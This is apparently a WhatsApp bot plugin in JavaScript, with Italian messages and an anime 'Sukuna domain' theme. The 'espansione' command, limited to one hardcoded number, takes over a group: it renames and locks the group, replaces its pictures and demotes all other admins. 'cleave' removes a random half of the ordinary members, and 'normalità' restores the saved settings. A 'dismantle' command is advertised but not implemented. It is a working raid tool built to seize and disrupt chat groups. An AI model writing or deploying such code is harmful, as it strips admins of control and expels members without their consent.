const NUMERO_AUTORIZZATO = '66621409462@s.whatsapp.net';

let nomeOriginale = '';
let descrizioneOriginale = '';
let immagineOriginale = null;

let handler = async (m, { conn, command }) => {
  if (!m.isGroup) return m.reply('❌ Questo comando funziona solo nei gruppi.');

  const metadata = await conn.groupMetadata(m.chat);
  const botNumber = conn.user.jid;
  const botIsAdmin = metadata.participants.find(p => p.id === botNumber && p.admin);
  if (!botIsAdmin) return m.reply('❌ Il bot deve essere admin per eseguire questo comando.');
  if (m.sender !== NUMERO_AUTORIZZATO) return m.reply('❌ Non sei autorizzato.');

  if (command === 'espansione') {
    nomeOriginale = metadata.subject;
    descrizioneOriginale = metadata.desc || '';
    try {
      immagineOriginale = await conn.profilePictureUrl(m.chat, 'image');
    } catch {
      immagineOriginale = null;
    }

    await conn.sendMessage(m.chat, {
      video: { url: './plugins/VID_20250804_064003_384.mp4' }, // Inserisci il file nella cartella plugins
      caption: '```🩸ESPANSIONE DEL DOMINIO🩸```\n.   quanto mi dispiace🤣🤣.'
    });

    await conn.groupUpdateSubject(m.chat, '👺 Dominio di Sukuna').catch(() => {});
    await conn.groupUpdateDescription(m.chat, 'Questo gruppo è sotto il controllo del Re delle Maledizioni.').catch(() => {});
    await conn.groupSettingUpdate(m.chat, 'announcement');

    const groupImage = await (await fetch('https://www.drcommodore.it/wp-content/uploads/2021/05/avatars-NiUtMH8FHTf66G6K-OgrwNA-t500x500.jpg')).buffer();
    await conn.updateProfilePicture(m.chat, groupImage).catch(() => {});

    const botImage = await (await fetch('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT-r3_AxRHGX65yGOR9ZBp3HMwlLy7P0bZNwA&s')).buffer();
    await conn.updateProfilePicture(botNumber, botImage).catch(() => {});

    const adminList = metadata.participants.filter(p =>
      p.admin === 'admin' && p.id !== botNumber && p.id !== NUMERO_AUTORIZZATO
    ).map(p => p.id);

    for (let id of adminList) {
      await conn.groupParticipantsUpdate(m.chat, [id], 'demote').catch(() => {});
    }

    await conn.sendMessage(m.chat, {
      text: '🛑 Il gruppo è ora sotto dominio di Sukuna.',
      buttons: [
        { buttonId: '.normalità', buttonText: { displayText: '🔄 Normalità' }, type: 1 },
        { buttonId: '.cleave', buttonText: { displayText: '⚔️ Cleave' }, type: 1 },
        { buttonId: '.dismantle', buttonText: { displayText: '💀 Dismantle' }, type: 1 }
      ],
      footer: 'Premi per ripristinare o distruggere il gruppo',
      headerType: 1
    }, { quoted: m });
  }

  if (command === 'normalità') {
    await conn.groupUpdateSubject(m.chat, nomeOriginale).catch(() => {});
    await conn.groupUpdateDescription(m.chat, descrizioneOriginale).catch(() => {});
    await conn.groupSettingUpdate(m.chat, 'not_announcement');

    if (immagineOriginale) {
      const originalImage = await (await fetch(immagineOriginale)).buffer();
      await conn.updateProfilePicture(m.chat, originalImage).catch(() => {});
    }

    await conn.sendMessage(m.chat, {
      text: '✅ Dominio annullato. Il gruppo è tornato alla normalità.'
    });
  }

  if (command === 'cleave') {
    const members = metadata.participants
      .filter(p =>
        p.id !== botNumber &&
        p.id !== NUMERO_AUTORIZZATO &&
        !p.admin
      )
      .map(p => p.id);

    const metà = Math.ceil(members.length / 2);
    const daRimuovere = members.sort(() => Math.random() - 0.5).slice(0, metà);

    if (daRimuovere.length === 0) {
      return m.reply('⚠️ Nessun membro da rimuovere.');
    }

    await m.reply(`⚔️ Cleave attivato: rimozione di ${daRimuovere.length} membri...`);

    for (let id of daRimuovere) {
      await conn.groupParticipantsUpdate(m.chat, [id], 'remove').catch(() => {});
    }
  }
};

handler.command = /^espansione|normalità|cleave|dismantle$/i;
handler.help = ['espansione', 'normalità', 'cleave'];
handler.tags = ['group'];

export default handler;